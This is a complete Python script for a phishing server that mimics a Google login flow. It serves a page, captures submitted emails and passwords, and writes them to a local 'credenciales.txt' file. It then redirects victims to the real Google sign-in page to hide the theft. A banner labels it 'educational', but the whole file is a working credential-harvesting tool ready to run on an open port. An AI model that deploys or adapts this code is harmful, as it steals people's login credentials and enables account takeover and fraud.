#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers['Content-Length'])
            data = parse_qs(self.rfile.read(length).decode())
            
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] Email: {email} | Password: {password}\n"
            
            print(log_entry)
            with open('credenciales.txt', 'a') as f:
                f.write(log_entry)
            
            # Redirige a Google real
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com')
            self.end_headers()

if __name__ == '__main__':
    print("""\n
⚠️  Servidor de phishing educativo iniciado ⚠️
Accesible en: http:127.0.0.1:8080
Monitorea credenciales con: tail -f credenciales.txt
""")
    httpd = HTTPServer(('0.0.0.0', 8080), Handler)
    httpd.serve_forever()
